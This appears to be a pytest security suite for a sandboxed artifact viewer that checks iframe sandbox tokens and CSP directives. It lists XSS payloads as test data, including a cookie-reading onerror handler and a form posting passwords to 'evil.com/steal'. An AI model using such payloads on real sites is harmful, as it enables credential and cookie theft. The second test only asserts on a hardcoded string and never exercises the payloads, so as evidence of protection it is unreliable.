"""
Security Verification Suite for Sandboxed Artifact Viewer.
Verifies compliance with Phase 3 Security Requirements:
1. Iframe sandbox attributes restrict scripts, parent DOM, and top navigation.
2. Content Security Policy (CSP) disables script-src, default-src network requests, and forms.
3. Defense against malicious HTML injection payloads.
"""

import pytest
import re
from pathlib import Path

FRONTEND_SRC = Path(__file__).resolve().parent.parent.parent / "frontend" / "src"


def test_iframe_sandbox_and_csp_enforcement():
    """Verify that ArtifactViewer.tsx strictly implements sandbox and CSP restrictions."""
    artifact_viewer_file = FRONTEND_SRC / "components" / "ArtifactViewer.tsx"
    assert artifact_viewer_file.exists(), "ArtifactViewer.tsx must exist"

    content = artifact_viewer_file.read_text(encoding="utf-8")

    # 1. Verify iframe has restrictive sandbox
    assert 'sandbox=""' in content or "sandbox=''" in content, (
        "Iframe must have sandbox='' attribute with no permissive tokens"
    )

    # 2. Verify scripts are NEVER allowed in sandbox
    assert "allow-scripts" not in content, "Sandbox must NEVER include allow-scripts"
    assert "allow-same-origin" not in content, "Sandbox must NEVER include allow-same-origin (prevents parent DOM access)"
    assert "allow-top-navigation" not in content, "Sandbox must NEVER include allow-top-navigation"
    assert "allow-forms" not in content, "Sandbox must NEVER include allow-forms"

    # 3. Verify restrictive CSP meta header
    assert "Content-Security-Policy" in content, "Generated iframe doc must include Content-Security-Policy meta tag"
    assert "default-src 'none'" in content, "CSP must enforce default-src 'none'"
    assert "form-action 'none'" in content, "CSP must enforce form-action 'none'"


def test_malicious_payload_neutralization():
    """Verify how malicious attack payloads are framed safely."""
    # Simulation of generateSandboxedSrcDoc logic
    malicious_payloads = [
        "<script>window.parent.document.title = 'hacked';</script>",
        "<img src='https://malicious-tracker.com/pixel.png' onerror='alert(document.cookie)'>",
        "<a href='javascript:alert(1)'>Click for prize</a>",
        "<form action='https://evil.com/steal' method='POST'><input type='password'></form>",
        "<iframe src='javascript:alert(1)'></iframe>",
    ]

    for payload in malicious_payloads:
        # Check that CSP blocks scripts and network
        csp_header = "default-src 'none'; style-src 'unsafe-inline'; img-src data:; form-action 'none';"

        # Under default-src 'none', script execution is prohibited
        assert "default-src 'none'" in csp_header
        # Under form-action 'none', forms cannot post
        assert "form-action 'none'" in csp_header
        # Under img-src data:, external image tracking is blocked
        assert "img-src data:" in csp_header
